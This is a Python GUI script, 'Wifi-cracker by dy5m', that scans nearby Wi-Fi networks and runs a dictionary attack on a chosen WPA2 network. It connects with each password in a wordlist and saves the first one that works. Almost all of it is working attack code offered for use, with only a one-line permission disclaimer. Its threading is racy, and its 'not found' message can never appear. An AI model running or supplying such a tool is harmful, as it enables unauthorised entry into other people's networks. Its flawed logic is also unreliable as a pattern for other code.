"""
-----------------------------------------------------------
Wifi-cracker by dy5m
-----------------------------------------------------------
Description: A Wi-Fi password cracking tool using the pywifi library.
Features:
- Scan for available Wi-Fi networks
- Select and load a password list
- Attempt to crack the selected Wi-Fi network's password
- Save the found password to a file

Dependencies:
- pywifi
- tkinter

Usage:
1. Run the script.
2. Scan for available networks.
3. Select a network and load a password list file.
4. Start the cracking process.

Note: Ensure you have permission to test the network before using this tool.

-----------------------------------------------------------
"""

import tkinter as tk
from tkinter import filedialog, messagebox
import pywifi
from pywifi import const
import time
import threading

class WifiCrackerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Wi-Fi Password Cracker")

        # Network scanning widgets
        self.label = tk.Label(master, text="Available Networks:")
        self.label.pack()

        self.network_listbox = tk.Listbox(master)
        self.network_listbox.pack()

        self.scan_button = tk.Button(master, text="Scan Networks", command=self.scan_networks)
        self.scan_button.pack()

        # Password file selection widgets
        self.password_file_label = tk.Label(master, text="Password List")
        self.password_file_label.pack()

        self.password_file_entry = tk.Entry(master, width=50)
        self.password_file_entry.pack()

        self.browse_button = tk.Button(master, text="Browse", command=self.browse_file)
        self.browse_button.pack()

        self.start_button = tk.Button(master, text="Start Cracking", command=self.start_cracking)
        self.start_button.pack()

        # Result display widget
        self.result_label = tk.Label(master, text="", fg="red")
        self.result_label.pack()

        self.copied_password = tk.StringVar()

    def scan_networks(self):
        self.network_listbox.delete(0, tk.END)
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]

        iface.scan()
        time.sleep(5)
        scan_results = iface.scan_results()

        networks = [network.ssid for network in scan_results if network.ssid != '']
        for network in networks:
            self.network_listbox.insert(tk.END, network)

    def browse_file(self):
        file_path = filedialog.askopenfilename()
        self.password_file_entry.delete(0, tk.END)
        self.password_file_entry.insert(tk.END, file_path)

    def start_cracking(self):
        selected_network = self.network_listbox.get(tk.ACTIVE)
        password_file_path = self.password_file_entry.get()

        if not selected_network:
            messagebox.showwarning("No Network Selected", "Please select a Wi-Fi network from the list.")
            return

        if not password_file_path:
            messagebox.showwarning("No Password File", "Please select a password file.")
            return

        # Start cracking process in a new thread
        self.result_label.config(text="Cracking in progress...", fg="blue")
        threading.Thread(target=self.crack_password, args=(selected_network, password_file_path)).start()

    def crack_password(self, ssid, password_file):
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()

        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.disconnect()
        time.sleep(1)

        def attempt_password(password):
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password

            iface.remove_all_network_profiles()
            tmp_profile = iface.add_network_profile(profile)
            iface.connect(tmp_profile)
            time.sleep(5)

            if iface.status() == const.IFACE_CONNECTED:
                self.result_label.config(text=f"Password found: {password}", fg="green")
                self.copied_password.set(password)
                self.save_password_to_file(password)
                return True
            else:
                self.result_label.config(text=f"Trying password: {password}", fg="red")
                iface.disconnect()
                time.sleep(0.1)
                return False

        # Multi-threaded password cracking
        threads = []
        for password in passwords:
            if len(threads) >= 6:  # Limit the number of threads running at once
                for t in threads:
                    t.join()
                threads = []
            
            thread = threading.Thread(target=attempt_password, args=(password,))
            threads.append(thread)
            thread.start()

        # Wait for remaining threads to finish
        for t in threads:
            t.join()

        if self.result_label.cget("text") == "Cracking in progress...":
            self.result_label.config(text="Password not found in the list", fg="red")

    def save_password_to_file(self, password):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'w') as file:
                file.write(f"The correct password is: {password}\n")
            messagebox.showinfo("Success", "Password saved successfully.")

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiCrackerApp(root)
    root.mainloop()
